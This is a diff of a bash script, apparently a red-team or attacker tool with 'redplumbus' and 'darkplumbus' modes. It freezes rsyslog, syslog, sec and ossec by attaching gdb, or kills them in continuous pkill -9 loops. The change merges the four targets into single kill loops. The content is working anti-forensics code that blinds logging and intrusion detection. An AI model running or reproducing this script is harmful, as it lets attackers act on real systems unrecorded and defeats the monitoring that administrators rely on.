@@ -42,49 +42,43 @@
 killloop () {
 resume=$((SECONDS+540))
 while [ $SECONDS -lt $resume ]; do
-  pkill -9 $target; 
-   # to be compatible with those wierd old sleeps that don't have decimals...
+  pkill -9 $target1 $target2 $target3 $target4; 
+   # to be compatible with those wierd old sleeps that don't have decimals we || to 1, but 0.9 is better tuned
    # give a little sleep as to not raise the CPU
-  sleep 0.5 || sleep 1
-done &
+  sleep 0.9 || sleep 1
+done
 }
 
 dpkillloop () {
 while true; do
-  pkill -9 $target; 
-  # to be compatible with those wierd old sleeps that don't have decimals
+  pkill -9 $target1 $target2 $target3 $target4; 
+  # to be compatible with those wierd old sleeps that don't have decimals we || to 1, but 0.9 is better tuned
   # give a little sleep as to not raise the CPU
-  sleep 0.5 || sleep 1
-done &
+  sleep 0.9 || sleep 1
+done
 }
 
 freeze1 () {
-  target=rsyslog
-  pgrep -x rsyslog | xargs gdb -p || killloop 2>/dev/null
-  target=sec
+  target1=rsyslog
+  target2=sec
+  target3=ossec
+  target4=syslog
+  pgrep -x rsyslog | xargs gdb -p || killloop 2>/dev/null  
   pgrep -x sec | xargs gdb -p || killloop 2>/dev/null
-  target=ossec
   pgrep -x ossec | xargs gdb -p || killloop 2>/dev/null
-}
-
-freeze2 () {
-  target=syslog
   pgrep -x syslog | xargs gdb -p || killloop 2>/dev/null
 }
 
 # The darkplumbus freezes that don't stop.
 
 dpfreeze1 () {
-  target=rsyslog
+  target1=rsyslog
+  target2=sec
+  target3=ossec
+  target4=syslog
   pgrep -x rsyslog | xargs gdb -p || dpkillloop 2>/dev/null
-  target=sec
   pgrep -x sec | xargs gdb -p || dpkillloop 2>/dev/null
-  target=ossec
   pgrep -x ossec | xargs gdb -p || dpkillloop 2>/dev/null
-}
-
-dpfreeze2 () {
-  target=syslog
   pgrep -x syslog | xargs gdb -p || dpkillloop 2>/dev/null
 }
 
@@ -136,7 +130,6 @@ main () {
 case "$1" in
   -redplumbus)
     freeze1 &
-    freeze2 &
 #    freeze3 &
     freeze4 &
     freeze5 &
@@ -168,7 +161,6 @@ case "$1" in
 ;;
 *)
   freeze1 &
-  freeze2 &
 #  freeze3 &
   freeze4 &
   freeze5 &
